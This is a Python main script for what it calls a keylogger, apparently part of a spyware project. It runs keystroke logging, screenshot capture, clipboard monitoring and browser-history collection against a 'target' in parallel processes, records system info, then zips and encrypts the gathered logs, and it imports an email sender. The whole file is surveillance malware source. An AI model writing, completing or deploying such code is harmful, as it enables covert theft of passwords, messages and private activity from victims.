import os
import keyboard
import multiprocessing
from keygrap import Keylogger
from screenshots import ScreenshotCapture
from clipboard_grap import ClipboardMonitor
from browserHistory import BrowserHistoryFetcher
from System_info import SystemInfoRecorder
from Zipper import Zip
from mailer import EmailSender
from Cryptography.KeyGenerator import KeyGenerator
from Cryptography.EncryptFile import ZipFileEncryptor

execute = False

def stop_processes():
    global execute
    execute = True


if __name__ == "__main__":

    # creating folder "Logs" to store all the data gathered from target
    if not os.path.exists("../Logs"):
        relative_path = "../Logs"

        script_directory = os.path.dirname(os.path.abspath(__file__))
        log_folder_path = os.path.join(script_directory, relative_path)

        os.makedirs(log_folder_path, exist_ok=True)

    # creating objects for Keylogger functionalities
    keyGrab = Keylogger()
    screenshot = ScreenshotCapture()
    clipboard = ClipboardMonitor()
    browser_history = BrowserHistoryFetcher()
    system = SystemInfoRecorder()

    # starting functionalities
    system.write_system_info_to_file()

    # creating processes
    processes = [
        multiprocessing.Process(target=keyGrab.start_logging),
        multiprocessing.Process(target=screenshot.start_capture),
        multiprocessing.Process(target=clipboard.start_monitoring),
        multiprocessing.Process(target=browser_history.fetch_and_save_history)
    ]

    # starting the processes
    for process in processes:
        process.start()

    # Registering the hotkey to stop processes
    keyboard.add_hotkey("ctrl + shift + alt + s", stop_processes)

    if not execute:
        try:
            while True:
                pass # to keep main program running
        except KeyboardInterrupt:
            print("user shutdown requested")
    else:
        for process in processes:
            process.terminate()

    # Unregistering the hotkey
    keyboard.remove_hotkey(stop_processes)


    # Zipping Logs folder and deleting it
    zip = Zip()
    zip.zip_file("../Logs","LogsZip")
    os.remove("../Logs")

    # generating key to encrypt LogsZip file
    key_generator = KeyGenerator()
    key = key_generator.generate_Key()

    # Encrypting LogsZip zip file
    encrypt = ZipFileEncryptor(key)
    encrypt.encrypt_file("../LogsZip","../ELogsZip")
    os.remove("../LogsZip")

